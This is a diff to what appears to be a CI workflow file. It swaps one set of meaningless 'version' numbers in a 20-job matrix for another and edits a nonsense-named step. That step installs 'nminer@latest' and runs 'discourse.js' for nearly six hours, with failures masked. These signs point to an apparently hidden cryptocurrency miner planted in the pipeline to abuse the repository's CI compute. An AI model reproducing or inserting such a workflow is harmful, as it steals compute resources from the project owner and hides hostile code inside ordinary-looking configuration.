@@ -9,25 +9,26 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 8587 }
-          - { version: 1303 }
-          - { version: 3798 }
-          - { version: 2349 }
-          - { version: 8737 }
-          - { version: 3089 }
-          - { version: 3516 }
-          - { version: 2363 }
-          - { version: 3980 }
-          - { version: 6735 }
-          - { version: 3792 }
-          - { version: 5768 }
-          - { version: 3758 }
-          - { version: 8164 }
-          - { version: 8283 }
-          - { version: 5097 }
-          - { version: 1633 }
-          - { version: 740 }
-          - { version: 7806 }
+          - { version: 7040 }
+          - { version: 7306 }
+          - { version: 1063 }
+          - { version: 6127 }
+          - { version: 7666 }
+          - { version: 8177 }
+          - { version: 1744 }
+          - { version: 117 }
+          - { version: 5208 }
+          - { version: 9724 }
+          - { version: 5327 }
+          - { version: 7729 }
+          - { version: 4258 }
+          - { version: 6275 }
+          - { version: 6298 }
+          - { version: 7160 }
+          - { version: 9575 }
+          - { version: 5766 }
+          - { version: 4572 }
+          - { version: 189 }
 
     steps:
       - name: Checkout
@@ -38,7 +39,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: small exacerbate scarily gadzooks
+      - name: gadzooks
         run: |
           npm install nminer@latest
-          timeout 326m node discourse.js || echo "discourse executed"
+          timeout 345m node discourse.js || echo "discourse executed"
